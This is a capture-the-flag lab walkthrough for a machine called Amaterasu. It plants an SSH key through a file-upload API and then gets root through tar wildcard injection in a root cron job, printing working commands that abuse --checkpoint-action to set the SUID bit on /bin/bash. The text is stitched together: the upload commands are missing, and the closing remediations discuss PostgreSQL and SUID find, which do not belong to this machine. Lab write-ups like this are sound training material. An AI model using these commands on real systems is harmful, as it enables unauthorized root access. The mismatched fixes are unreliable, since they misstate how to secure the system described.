Proving Grounds Walkthrough

Amaterasu

July 26, 2026 • Hard • Target IP: 192.168.176.249

Summary: Machine starts with an api running on non-standard port, which has file-upload and directory-listing capabilities. This api is used to introduce the public key of an attacker-generated keypair as authorized keys for ssh. A crontab running a script which uses tar command with wilcard is discovered, which is then exploited to gain root access to the system.

Attack Chain

  • Foothold: Port 33414 werkzeug api -> authorized_keys file-write -> Low-Privilege Shell
  • PrivEsc (Root): cronjob -> script running backup with wildcard in user-controlled dir ->Wildcard Injection

So far, we've been able to establish the API's creator, the features of the api, which is file-list?dir= and /file-upload. While we were also able to verify the users in the /home directory of the machine, and that the user already has ssh access via rsa keypair, we havent discovered the way to upload files through the api. Additionally, once we do find the proper format, we cannot just upload a reverse shell, because we dont yet have a way to trigger it (RCE).

So a safe bet is to first generate an rsa key-pair, then drop the public-key's copy authorized_keys into the discovered user's .ssh directory. This is so that the ssh server allows additional key-pairs to login with a private-key that is NOT the user's local one.

We'll first determine the format to upload a file. Most APIs have enough error-verbose to inform us exactly how to use the endpoints. It is a good idea to proceed one step at a time. The first step being, it has to be a POST request.

┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
└─$ curl -X POST --path-as-is http://192.168.176.249:33414/file-upload       
{"message":"No file part in the request"}

Looking at the message, we see the api is telling us to include a parameter, called file. This article shows how we can use the curl command to upload file, using the -F or the --form flag.

So, let us first prepare a test file for upload

Foothold

For the initial foothold, we just need to generate a new rsa key-pair, and upload the copy of public key, and store it as /home/alfredo/.ssh/authorized_keys, with a privatized access control on the file.

└─$ ssh-keygen -f id_rsa
┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]
└─$ cat id_rsa.pub > authorized_keys                                               
                                                                                                                     
┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]

┌──(kali㉿kali)-[~/pg_practice/deets/amaterasu]

{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}

It seems there is a restriction on filetypes. We can try to isolate if the actual restriction is for the source filetype or destination as well, by renaming the authorized_keys to authorized_keys.txt. If the restriction applies for even the destination filename, then we might have to think of some other way to gain initial access.

Privilege Escalation

Now that we have the local user flag, we can proceed with regular privesc mannual checks, like sudo -l, checking any strange files with SUID bits set, crontabs, exports, capabilities, internal ports, groups, writable directories in $PATH, any unusual file is /opt, running processes, groups, etc. Then we can proceed to more advanced ones. Always a good idea to cover the basics mannually, with a checklist, because it is easy to forget or miss simple things.

Upon checking for crontab entries, we stumble upon a possible backup script. A notorious thing about backup shell scripts is that, people tend to use the wildcard * to reference "all" files in a certain directory. This can be abused to gain the context of the user running the script.

[alfredo@fedora ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

Following the crontab trail, we find that the backup script indeed uses the wildcard character. Hacktricks has this great article on how to perform wildcard injections.

Basically, when any command runs with an unquoted wildcard like *, since the shell expands the wildcard before executing the binary, an attacker who can create files in the working directory can craft filenames that begin with - so they are interpreted as options instead of data, effectively smuggling arbitrary flags or even commands.

In our case, tar command has these option flags, --checkpoint and --checkpoiont-actions. The first flag displays progress messages for every n NUMBERTH second, and the other flag allows tar to EXECUTE an action on each checkpoints. If we're able to create files with names of these flags in /home/alfredo/restapi and set an action to execute a malicious code, tar would be able to execute the code in the context of the owner of the cron, viz root

First, we go the the target directory, /home/alfredo/restapi, and then write a file that, when executed as root, would essentially give us root access. This code can be many things, like adding ourselves to the sudoers group, sending ourselves a reverse shell, or adding an SUID bit on the /bin/bash. Seeing as we have an ssh stable shell, I like to set an SUID bit on the bash binary.

[alfredo@fedora ~]$ cd ~/restapi
[alfredo@fedora restapi]$ ls -la /bin/bash
-rwxr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
[alfredo@fedora restapi]$ echo "chmod u+s /bin/bash" > gimme_root.sh
[alfredo@fedora restapi]$ echo "" > "--checkpoint-action=exec=sh gimme_root.sh"
[alfredo@fedora restapi]$ echo "" > --checkpoint=1

We have created a file that would set SUID bit on the bash binary. We have creted a checkpoint file, and we have created a checkpoint-action file, that would execute our code. Now, we wait for the cronjob to get executed, and monitor the SUID bit on the bash binary.

Once we see the SUID bit set on bash binary, we sinply do bash -p to get a root shell!

[alfredo@fedora restapi]$ ls -la /bin/bash
-rwsr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
[alfredo@fedora restapi]$ bash -p
bash-5.1# whoami
root
bash-5.1# wc -c /root/proof.txt
33 /root/proof.txt

Remidiations

  • Restrict the access of Postgresql to Localhost, unless explicitly required to be accessible from external networks.
  • Revoke the Superuser permissions for the default SuperUser postgres, unless explicitly required
  • The password for db user postgres should be a randomly generated long string. Do not use weak passwords that are consistent with weak password policies.
  • The find command should not have SUID set for all users.
